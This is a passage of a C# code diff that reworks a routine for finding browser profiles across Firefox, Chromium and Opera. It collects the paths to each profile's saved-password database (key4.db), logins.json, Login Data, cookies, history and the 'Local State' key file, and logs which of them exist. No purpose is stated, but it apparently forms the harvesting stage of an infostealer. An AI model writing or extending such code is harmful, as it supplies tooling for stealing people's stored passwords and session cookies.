+                    if (defaultProfiles.Count > 0)
                     {
-                        fileCount++;
-                        if (geckoRequiredFiles.Contains(file))
-                            requiredFileCount++;
+                        foreach (var profileDir in defaultProfiles)
+                        {
+                            TryAddGeckoProfile(profileDir, geckoBrowsers);
+                        }
                     }
                 }
-                
-                float confidence = (float)fileCount / geckoProfileFiles.Length * 100;
-                return confidence >= 50 && requiredFileCount >= 1;
             }
-            catch { }
-            
-            return false;
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[ERROR] Checking Firefox browser in {path}: {ex.Message}");
+            }
         }
-        
-        private async Task<GeckoProfile> CreateGeckoProfile(string profileDir)
+
+        private void TryAddGeckoProfile(string profileDir, ConcurrentBag<BrowserGecko> geckoBrowsers)
         {
             try
             {
+                string key4Path = Path.Combine(profileDir, "key4.db");
+                string loginsPath = Path.Combine(profileDir, "logins.json");
                 string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                 string historyPath = Path.Combine(profileDir, "places.sqlite");
-                string key4Path = Path.Combine(profileDir, "key4.db");
-                string loginJsonPath = Path.Combine(profileDir, "logins.json");
-                string formHistoryPath = Path.Combine(profileDir, "formhistory.sqlite");
-                string contentPrefsPath = Path.Combine(profileDir, "content-prefs.sqlite");
-                string extensionsPath = Path.Combine(profileDir, "extensions.json");
-                string permissionsPath = Path.Combine(profileDir, "permissions.sqlite");
-                string prefsJsPath = Path.Combine(profileDir, "prefs.js");
-                
-                bool[] fileExists = await Task.WhenAll(
-                    Task.Run(() => File.Exists(cookiesPath)),
-                    Task.Run(() => File.Exists(historyPath)),
-                    Task.Run(() => File.Exists(key4Path)),
-                    Task.Run(() => File.Exists(loginJsonPath)),
-                    Task.Run(() => File.Exists(formHistoryPath)),
-                    Task.Run(() => File.Exists(contentPrefsPath)),
-                    Task.Run(() => File.Exists(extensionsPath)),
-                    Task.Run(() => File.Exists(permissionsPath)),
-                    Task.Run(() => File.Exists(prefsJsPath))
-                );
-                
-                int validFiles = fileExists.Count(exists => exists);
-                float confidence = (float)validFiles / geckoProfileFiles.Length * 100;
-                
-                int requiredFileCount = 0;
-                if (fileExists[0]) requiredFileCount++;
-                if (fileExists[1]) requiredFileCount++;
-                
-                bool isValidProfile = confidence >= 50 && requiredFileCount >= 1;
-                
-                if (isValidProfile)
+
+                // Count valid files
+                int validFiles = 0;
+                if (File.Exists(key4Path)) validFiles++;
+                if (File.Exists(loginsPath)) validFiles++;
+                if (File.Exists(cookiesPath)) validFiles++;
+                if (File.Exists(historyPath)) validFiles++;
+
+                if (validFiles >= 2)
                 {
-                    return new GeckoProfile
+                    string browserName = Directory.GetParent(Directory.GetParent(profileDir).FullName)?.Name + "\\" +
+                                         Path.GetFileName(Directory.GetParent(profileDir).FullName);
+
+                    geckoBrowsers.Add(new BrowserGecko
                     {
-                        Cookies = fileExists[0] ? cookiesPath : string.Empty,
-                        History = fileExists[1] ? historyPath : string.Empty,
-                        Key4DB = fileExists[2] ? key4Path : string.Empty,
-                        LoginsJson = fileExists[3] ? loginJsonPath : string.Empty,
-                        Name = Path.GetFileName(profileDir),
-                        Path = profileDir
-                    };
+                        Name = browserName,
+                        Path = profileDir,
+                        Key4 = key4Path,
+                        Logins = loginsPath,
+                        Cookies = cookiesPath,
+                        History = historyPath,
+                        ProfilesDir = Directory.GetParent(profileDir).FullName
+                    });
+
+                    Debug.WriteLine($"[SUCCESS] Added Firefox profile with {validFiles}/4 data files");
                 }
             }
-            catch { }
-            
-            return new GeckoProfile();
-        }
-        
-        private async Task<string[]> ParseProfilePaths(string iniContent, string profilesDir)
-        {
-            var paths = new List<string>();
-            var lines = iniContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
-            string currentPath = "";
-            bool isRelative = false;
-            
-            await Task.Run(() => {
-                foreach (var line in lines)
-                {
-                    if (line.StartsWith("[Profile", StringComparison.OrdinalIgnoreCase))
-                    {
-                        if (!string.IsNullOrEmpty(currentPath))
-                        {
-                            paths.Add(isRelative ? Path.Combine(profilesDir, currentPath) : currentPath);
-                        }
-                        currentPath = "";
-                        isRelative = false;
-                    }
-                    else if (line.StartsWith("Path=", StringComparison.OrdinalIgnoreCase))
-                    {
-                        currentPath = line.Substring(5).Trim();
-                    }
-                    else if (line.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase))
-                    {
-                        isRelative = line.Substring(11).Trim() == "1";
-                    }
-                }
-                
-                if (!string.IsNullOrEmpty(currentPath))
-                {
-                    paths.Add(isRelative ? Path.Combine(profilesDir, currentPath) : currentPath);
-                }
-            });
-            
-            return paths.ToArray();
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[ERROR] Adding Firefox profile: {ex.Message}");
+            }
         }
 
-        private bool ContainsWebViewTerm(string path)
+        private void CheckForOperaBrowser(string path, ConcurrentBag<BrowserChromium> chromiumBrowsers)
         {
-            string lowerPath = path.ToLowerInvariant();
-            
-            foreach (var appName in appNames)
+            try
             {
-                if (lowerPath.Contains("\\" + appName + "\\"))
-                    return true;
+                var profiles = new List<ProfileChromium>();
+                TryAddChromiumProfile(profiles, path, "Default");
+
+                if (profiles.Count > 0)
+                {
+                    chromiumBrowsers.Add(new BrowserChromium
+                    {
+                        Name = "Opera",
+                        LocalState = Path.Combine(path, "Local State"),
+                        Path = path,
+                        Profiles = profiles.ToArray()
+                    });
+                    Debug.WriteLine($"[SUCCESS] Added Opera browser with {profiles.Count} profiles");
+                }
             }
-            
-            foreach (var term in webViewTerms)
+            catch (Exception ex)
             {
-                if (lowerPath.Contains(term))
-                    return true;
+                Debug.WriteLine($"[ERROR] Checking Opera browser in {path}: {ex.Message}");
             }
-            
-            return false;
+        }
+
+        private bool IsSystemDirectory(string dirName)
+        {
+            string lower = dirName.ToLowerInvariant();
+            return lower == "crash reports" || lower == "gcm_store" ||
+                   lower == "cache" || lower == "session storage" ||
+                   lower == "jumplisticons" || lower.StartsWith(".");
+        }
+
+        private void LogFoundBrowsers(ConcurrentBag<BrowserChromium> chromiumBrowsers,
+                                           ConcurrentBag<BrowserGecko> geckoBrowsers)
+        {
+            Debug.WriteLine("========== FOUND CHROMIUM BROWSERS ==========");
+            foreach (var browser in chromiumBrowsers)
+            {
+                Debug.WriteLine($"[BROWSER] {browser.Name}: {browser.Path}");
+                Debug.WriteLine($"[LOCAL_STATE] {browser.LocalState}");
+
+                foreach (var profile in browser.Profiles)
+                {
+                    Debug.WriteLine($"  [PROFILE] {profile.Name}");
+                    Debug.WriteLine($"    LoginData: {FileExistsInfo(profile.LoginData)}");
+                    Debug.WriteLine($"    WebData: {FileExistsInfo(profile.WebData)}");
+                    Debug.WriteLine($"    Cookies: {FileExistsInfo(profile.Cookies)}");
+                    Debug.WriteLine($"    History: {FileExistsInfo(profile.History)}");
+                    Debug.WriteLine($"    Bookmarks: {FileExistsInfo(profile.Bookmarks)}");
+                }
+                Debug.WriteLine("-------------------------------------------");
+            }
+
+            Debug.WriteLine("========== FOUND GECKO BROWSERS ==========");
+            foreach (var browser in geckoBrowsers)
+            {
+                Debug.WriteLine($"[BROWSER] {browser.Name}: {browser.Path}");
+                Debug.WriteLine($"[PROFILES_DIR] {browser.ProfilesDir}");
+                Debug.WriteLine($"  Key4DB: {FileExistsInfo(browser.Key4)}");
+                Debug.WriteLine($"  LoginsJson: {FileExistsInfo(browser.Logins)}");
+                Debug.WriteLine($"  Cookies: {FileExistsInfo(browser.Cookies)}");
+                Debug.WriteLine($"  History: {FileExistsInfo(browser.History)}");
+                Debug.WriteLine("-------------------------------------------");
+            }
+        }
+
+        private string FileExistsInfo(string path)
+        {
+            return $"{path} ({(File.Exists(path) ? "Found" : "Missing")})";
         }
     }
 }
